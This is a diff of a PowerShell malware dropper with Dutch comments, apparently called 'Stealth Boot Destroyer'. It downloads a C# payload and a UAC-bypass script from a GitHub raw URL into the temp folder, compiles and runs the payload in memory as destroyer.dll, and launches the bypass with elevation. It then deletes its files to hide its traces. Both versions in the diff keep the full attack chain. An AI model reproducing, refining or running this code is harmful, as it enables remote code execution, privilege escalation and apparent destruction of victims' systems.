@@ -1,9 +1,7 @@
-# === PAYLOAD.TXT - STEALTH BOOT DESTROYER ===
-$ErrorActionPreference = "SilentlyContinue"
 $temp = $env:TEMP
 $web = New-Object Net.WebClient
 
-# --- 1. Download bestanden naar %TEMP% ---
+# Download bestanden
 $files = @(
     "https://raw.githubusercontent.com/archvault-cmd/files/refs/heads/main/payload.cs"
     "https://raw.githubusercontent.com/archvault-cmd/files/refs/heads/main/uac.ps1"
@@ -15,22 +13,16 @@ foreach($url in $files){
     $web.DownloadFile($url, "$temp\$name")
 }
 
-# --- 2. Compileer C# inline (geen .exe op schijf) ---
-$csCode = Get-Content "$temp\payload.cs" -Raw
+# Compileer C#
+$cs = Get-Content "$temp\payload.cs" -Raw
+Add-Type -TypeDefinition $cs -Language CSharp -ReferencedAssemblies "System.Windows.Forms","System.Drawing" -OutputAssembly "$temp\destroyer.dll"
 
-Add-Type -TypeDefinition $csCode -Language CSharp -ReferencedAssemblies @(
-    "System.Windows.Forms", "System.Drawing", "Microsoft.Win32.Registry"
-) -OutputAssembly "$temp\destroyer.dll" -OutputType Library
+# Run C#
+$asm = [System.Reflection.Assembly]::LoadFrom("$temp\destroyer.dll")
+$asm.GetType("Destroyer.Program").GetMethod("Main").Invoke($null, @())
 
-# Laad de DLL en roep Main aan
-$assembly = [System.Reflection.Assembly]::LoadFrom("$temp\destroyer.dll")
-$assembly.GetType("Destroyer.Program").GetMethod("Main").Invoke($null, @([object[]]@()))
+# UAC Bypass
+Start-Process powershell -ArgumentList "-File `"$temp\uac.ps1`"" -Verb RunAs
 
-# --- 3. Start UAC Bypass (wordt admin) ---
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -File `"$temp\uac.ps1`"" -Verb RunAs
-
-# --- 4. Wacht tot destroy.ps1 is uitgevoerd (via UAC) ---
-Start-Sleep -Seconds 45
-
-# --- 5. Ruim sporen op ---
-Remove-Item "$temp\payload.cs", "$temp\uac.ps1", "$temp\destroy.ps1", "$temp\destroyer.dll" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 60
+Remove-Item "$temp\payload.cs","$temp\uac.ps1","$temp\destroy.ps1","$temp\destroyer.dll" -Force -ErrorAction SilentlyContinue
